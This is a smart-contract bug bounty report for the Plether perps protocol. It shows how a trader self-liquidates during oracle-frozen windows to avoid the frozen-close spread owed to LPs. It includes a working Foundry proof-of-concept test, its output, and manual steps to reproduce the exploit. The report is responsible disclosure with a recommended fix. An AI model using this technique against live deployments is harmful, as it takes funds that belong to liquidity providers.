# \#97772 [SC-Medium] Self-liquidation during oracle-frozen windows bypasses the LP-owned frozen-close spread

**Submitted on Nov 3rd 2026 at 03:30:05 UTC by @cryptofox for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97772
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
During an oracle-frozen window (weekend or holiday), a trader can deliberately self-liquidate their own position instead of voluntarily closing it. Liquidation never applies the frozenCloseSpreadBps (0.50% of notional) that a voluntary close must pay during a freeze, so the trader exits at the stale mark while paying only the liquidation bountyBps charge (0.1% of notional, capped by the trader's own liquidation reserve) -- a large share of which (keeperShareBps) is refunded back to the trader as the self-appointed keeper. This moves value from LPs, who are meant to be compensated for stale-price exits via the frozen spread, to the trader. The attack is cheap, repeatable on every freeze window, and demonstrated with a passing Foundry PoC.

## Vulnerability Details
**Root cause.** `CfdEnginePlanLib.planLiquidation` (packages/perps/src/libraries/CfdEnginePlanLib.sol) never references `frozenCloseSpreadBps`. Only the voluntary-close path, `CloseAccountingLib.buildCloseState` (packages/perps/src/libraries/CloseAccountingLib.sol:123), applies `state.frozenSpreadAssets = (notionalAssets * inputs.frozenCloseSpreadBps) / 10_000`. SECURITY.md itself documents this gap as deliberate ("liquidation pricing and settlement retain adverse-confidence pricing and do not assess the spread ... This is a deliberate trade-off: preserve close and liquidation liveness during real closures without weakening live-market MEV protections"), but that documented trade-off does not account for a trader deliberately engineering their own account into a liquidatable state purely to use liquidation as a cheaper voluntary exit -- which is the new part of this report, and which I did not find mentioned in SECURITY.md's Known Limitations, the three prior audit reports in the repo, or the AI scan.

**Mechanism.**
1. During an oracle-frozen window the liquidation threshold uses `fadMarginBps` (3% of notional) instead of the normal maintenance margin (`CfdEnginePlanLib.planLiquidation`, gated on `snap.isFadWindow`).
2. Before the freeze, the trader opens a position and sets their PnL pledge just above the 3% FAD threshold.
3. Over the weekend, while the oracle is frozen, carry slowly erodes the pledge below the FAD requirement, making the account liquidatable at the stale (frozen) mark (`OracleFreshnessPolicyLib.fadMaxStaleness`).
4. The trader now holds a free option with no further action required:
   - If they want to keep the position (e.g. favourable weekend news), a small `addMargin` top-up (5 USDG in the PoC) keeps the account healthy and the liquidation reverts.
   - If they want out (e.g. they expect an adverse Monday gap), they let the account stay underfunded and call `liquidatePosition` on themselves (nothing in `OrderLiquidationHandler` / `CfdEngine._applyLiquidation` stops `keeper == account`, and a second controlled address would work identically). They exit at the same stale price a voluntary close would use, but without paying the 0.50% frozen spread, and they recover roughly half of the liquidation charge back via `keeperShareBps`.
5. This is repeatable on every freeze window; size is limited only by skew and depth caps.

## Impact
LPs are economically entitled to the frozen-close spread as compensation for absorbing stale-price exits during oracle-frozen windows. A trader who engineers this self-liquidation path captures that compensation instead, directly reducing the funds that remain with/accrue to the LP pool on every such exit. In the attached PoC (100k notional LONG position, Sunday 18:00 UTC freeze) the trader's ending balance is 487.505007 USDG higher via self-liquidation than via a voluntary close -- i.e. 487.505007 USDG that should have gone to the LP pool as frozen-close spread stays with the trader instead. This is directly reproducible and not bounded by any cap other than position size/skew/depth, so it can be repeated on every freeze window for as long as the trader keeps opening positions sized to sit just above the FAD margin threshold.

## Proof of Concept
Foundry test attached (`AuditFrozenSelfLiq.t.sol`), written against `packages/perps/test/perps/shared/CfdEngineTestBase.sol`. Run from `packages/perps/`:
```
forge test --match-path test/perps/AuditFrozenSelfLiq.t.sol -vv
```
Independently re-verified by me: fresh clone of this repository at the exact commit in scope (a82d4fefb02768e5b3bddcc97dee371eee24fea8), full `forge build`, then the PoC run from scratch. Both tests pass:

- `test_frozenExit_closeVsSelfLiquidation`: balance before exit 9,957.504991 USDG; voluntary close (path A) 9,415.819726 USDG; self-liquidation (path B) 9,903.324733 USDG. B - A = 487.505007 USDG saved by self-liquidating.
- `test_addMarginKeepsOptionAlive`: confirms a 5 USDG top-up removes the liquidation path (the account becomes healthy again), showing the trader genuinely holds an optional, deliberately-engineered position rather than an accidental one.

The PoC calls `engine.liquidatePosition` via a router prank with a mock oracle price (skipping the router's Pyth parsing/confidence pipeline); a full PoC driven through the router with a signed Friday-close Pyth basket would still be worth building to confirm the adverse-confidence shift doesn't close the gap, but FX Friday-close confidence widths are far below the gap size found here.

## Severity justification
I classified this under "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield" since it is a concrete, repeatable, directly-measured transfer of LP-owed value to the trader's own balance. That said, the per-event impact is bounded (~0.49% of the exited notional) rather than unbounded/insolvency-causing, so I'd ask the triager to weigh the real bound shown in the PoC against the Critical category this impact maps to on the program page -- I'm flagging this transparently rather than picking a severity to maximize reward.

## Recommendation
Apply `frozenCloseSpreadBps` (or an equivalent charge) to liquidations that occur during an oracle-frozen window when `keeper == account` (or more generally, treat self-initiated liquidation during a freeze the same as a voluntary close for spread purposes), or disallow self-liquidation entirely during frozen/FAD windows.

## Proof of Concept

## Proof of Concept

Foundry test, add as `packages/perps/test/perps/AuditFrozenSelfLiq.t.sol` (uses the repo's own `CfdEngineTestBase`):

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {CfdEngineTestBase} from "./shared/CfdEngineTestBase.sol";
import {console} from "forge-std/console.sol";

contract AuditFrozenSelfLiqTest is CfdEngineTestBase {

    address internal trader = address(0xBEEF01);
    uint256 internal constant SIZE = 100_000e18; // 100k notional at 1.0

    function _setup() internal returns (uint256 sat) {
        sat = _nextSaturdayNoon();
        vm.warp(sat - 2 days); // Thursday noon UTC, live market
        _fundTrader(trader, 10_000e6);
        uint256 snap = vm.snapshotState();
        _open(trader, CfdTypes.Side.LONG, SIZE, 4000e6, 1e8);
        uint256 diff = 4000e6 - clearinghouse.pnlPledgeAssets(trader);
        vm.revertToState(snap);
        // Target pledge = FAD requirement (3% of 100k = 3000 USDG) + 1 USDG
        _open(trader, CfdTypes.Side.LONG, SIZE, 3001e6 + diff, 1e8);
        console.log("pledge after open", clearinghouse.pnlPledgeAssets(trader));
        console.log("liq reserve", clearinghouse.liquidationReserveAssets(trader));
    }

    function test_frozenExit_closeVsSelfLiquidation() public {
        uint256 sat = _setup();
        // Saturday noon -> Sunday 18:00 UTC, oracle frozen, FAD active; carry drifts pledge under FAD margin
        vm.warp(sat + 30 hours);
        assertTrue(engine.isOracleFrozen(), "frozen");
        assertTrue(engine.isFadWindow(), "fad");

        uint256 snap = vm.snapshotState();
        uint256 balBefore = clearinghouse.balanceAssets(trader);

        // Path A: voluntary full close at the stale price
        _close(trader, CfdTypes.Side.LONG, SIZE, 1e8);
        uint256 balA = clearinghouse.balanceAssets(trader);
        vm.revertToState(snap);

        // Path B: self-liquidation (trader is the keeper) at the same stale price
        uint256 depth = pool.totalAssets();
        vm.prank(address(router));
        engine.liquidatePosition(trader, 1e8, depth, uint64(block.timestamp), trader);
        uint256 balB = clearinghouse.balanceAssets(trader);

        console.log("balance before exit", balBefore);
        console.log("A voluntary close  ", balA);
        console.log("B self-liquidation ", balB);
        console.log("B - A saved        ", balB - balA);
        assertGt(balB, balA, "self-liquidation cheaper");
    }

    function test_addMarginKeepsOptionAlive() public {
        uint256 sat = _setup();
        vm.warp(sat + 30 hours);
        uint256 depth = pool.totalAssets();
        // trader tops up 5 USDG -> no longer liquidatable
        vm.prank(trader);
        engine.addMargin(trader, 5e6);
        vm.prank(address(router));
        vm.expectRevert();
        engine.liquidatePosition(trader, 1e8, depth, uint64(block.timestamp), trader);
    }

}
```

**Run:**
```
cd packages/perps
forge test --match-path test/perps/AuditFrozenSelfLiq.t.sol -vv
```

**Result (re-run independently by me on a fresh clone of this repo at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8, full `forge build` from scratch, not reusing any pre-built cache):**
```
Ran 2 tests for test/perps/AuditFrozenSelfLiq.t.sol:AuditFrozenSelfLiqTest
[PASS] test_addMarginKeepsOptionAlive() (gas: 2425473)
Logs:
  pledge after open 3001000000
  liq reserve 100000000

[PASS] test_frozenExit_closeVsSelfLiquidation() (gas: 2375972)
Logs:
  pledge after open 3001000000
  liq reserve 100000000
  balance before exit 9957504991
  A voluntary close   9415819726
  B self-liquidation  9903324733
  B - A saved         487505007

Suite result: ok. 2 passed; 0 failed; 0 skipped
```

All amounts are 6-decimal USDG atoms, i.e. 487505007 = 487.505007 USDG saved by self-liquidating instead of voluntarily closing, on a single 100k-notional position, in a single freeze window.

**Steps to reproduce manually:**
1. Open a LONG position with notional N before a weekend/holiday freeze, sizing the PnL pledge to just above `fadMarginBps` (3%) of N.
2. Let the oracle freeze (Saturday/Sunday or a market holiday) and wait for carry to erode the pledge under the FAD requirement -- or open close enough to the threshold that it crosses within the freeze window.
3. Call `liquidatePosition` on your own account through the router (any keeper address works, including the trader's own second wallet).
4. Compare the resulting balance to what a voluntary `close` at the same stale price would have produced -- the self-liquidation path keeps the 0.50% `frozenCloseSpreadBps` that the voluntary close would have paid to LPs, plus a `keeperShareBps` rebate of the liquidation charge.
